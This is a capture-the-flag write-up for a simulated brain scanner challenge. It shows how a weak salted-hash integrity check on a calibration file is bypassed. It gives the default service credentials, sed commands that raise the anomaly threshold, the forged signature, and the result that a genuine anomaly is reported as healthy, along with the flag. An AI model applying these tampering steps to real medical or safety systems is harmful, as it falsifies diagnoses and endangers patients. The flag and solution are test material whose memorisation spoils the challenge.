# Bad Calibration — Brain Scans (210 pts)

The CS-9000 refuses to scan unless its calibration file passes an integrity check. Prove the check is worthless: tamper the calibration, keep the check green, and scan a genuinely anomalous patient as healthy.

## How I solved it

**1. Find the integrity mechanism.** Boot Live Linux (`POST /api/connect {"tool":"live-linux","port":"usb-a"}`), `sudo mount /dev/sda2 /mnt`, and read `/mnt/opt/scanworks/calibration/` — there's a README, a `verify.py`, `calib.json` and a `calib.json.sig`. The scheme:

```
sig = sha256( bytes-of-calib.json + integrity.salt )     # hex string in calib.json.sig
```

And the salt lives in... the same world-readable `config.yaml` right next to it: `integrity.salt: EM-2019`. No HMAC, no secret key — verify.py even has a "FIXME: replace with HMAC" comment. The check verifies nothing except that you can read the same disk everyone else can.

**2. Baseline the scan.** Log into the kiosk with the vendor default creds from the field manual (emedra-svc / ChangeMe!2019) and scan the active patient, Gideon Marsh (MRN 100413, patientId `p-100413`):

```
ANOMALY DETECTED — score 0.72 (threshold 0.35)
```

Genuine anomaly confirmed.

**3. Tamper.** Raise the threshold and forge the signature:

```
sudo sed -i s/0.35/0.99/g calib.json
newsig=$(sha256sum calib.json)  # then append the EM-2019 salt, sha256 again
```

One gotcha: busybox sed silently no-ops if you try to replace the whole sig line with a `^.*$` pattern — substring-replace the old hex instead, and it works.

```
sudo sed -i s/94f04a44.../<newhex>/ calib.json.sig
scanctl verify   -> calibration integrity: OK (signature verified)
```

**4. Scan again.** Now `scanctl scan` runs with the tampered calibration:

```
CALIBRATION OK (sig verified)  report_above=0.99
Patient: Gideon Marsh (MRN 100413)
RESULT: No abnormality detected   [UNSAFE: finding 0.72 >= safe 0.35 suppressed]
integrity-audit: deadface{c4l1br4t10n_f0rg3ry_h4rms_l1v3s}
```

The 0.72 anomaly is suppressed as "healthy" and the scan log proves it — exactly the patient-harm scenario the challenge wanted. (Note: the kiosk's own `/api/kiosk/scan` endpoint ignores calibration entirely; the calibration-checked path is `scanctl scan` in the shell.)

I restored the original calibration afterward — no need to leave the box broken for the next player.

## Flag

```
deadface{c4l1br4t10n_f0rg3ry_h4rms_l1v3s}
```
